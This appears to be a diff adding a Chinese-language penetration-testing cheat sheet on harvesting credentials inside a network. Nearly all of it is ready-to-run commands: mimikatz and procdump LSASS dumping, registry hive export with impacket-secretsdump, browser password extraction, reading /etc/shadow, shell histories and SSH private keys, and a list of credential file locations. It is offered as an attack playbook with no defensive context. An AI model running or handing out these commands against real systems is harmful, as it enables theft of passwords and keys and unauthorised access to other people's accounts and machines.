@@ -1,0 +1,98 @@
+# 内网密码抓取
+
+## Windows 密码抓取
+
+### 1. mimikatz
+```cmd
+# 提权后抓取
+privilege::debug
+sekurlsa::logonpasswords
+
+# 从 LSASS 提取
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+# 输出到文件
+log credentials.txt
+sekurlsa::logonpasswords
+```
+
+### 2. 注册表提取
+```cmd
+# 导出 SAM 和 SYSTEM 文件
+reg save hklm\sam sam.save
+reg save hklm\system system.save
+reg save hklm\security security.save
+
+# 离线破解
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+```
+
+### 3. 进程内存抓取
+```cmd
+# Procdump
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+# 传输到本地后用 mimikatz 打开
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+### 4. 浏览器密码
+```cmd
+# Chrome
+%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
+
+# 可使用 LaZagne 或 BrowserGhost 导出
+```
+
+## Linux 密码抓取
+
+### 1. /etc/shadow
+```bash
+cat /etc/shadow
+# 获取 hash 后使用 john 或 hashcat 爆破
+```
+
+### 2. 配置文件中的明文密码
+```bash
+grep -r "password" /etc/ 2>/dev/null
+grep -r "password" /home/* 2>/dev/null
+find /var/www/html -type f -name "*.php" -exec grep -l "password\|passwd\|pwd" {} \;
+```
+
+### 3. 历史命令
+```bash
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+```
+
+### 4. SSH 密钥
+```bash
+ls -la ~/.ssh/
+ls -la /home/*/.ssh/
+cat ~/.ssh/id_rsa
+```
+
+### 5. 内存抓取（需要 root）
+```bash
+# 从内存中提取密码
+strings /dev/mem | grep -i password
+# 使用 LiMe 工具提取内存镜像分析
+```
+
+## 常见存储位置
+```
+Windows:
+  %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
+  %USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml
+  %USERPROFILE%\AppData\Local\Microsoft\Credentials\
+
+Linux:
+  /etc/shadow
+  ~/.my.cnf
+  ~/.pgpass
+  ~/.netrc
+  /etc/ppp/chap-secrets
+```
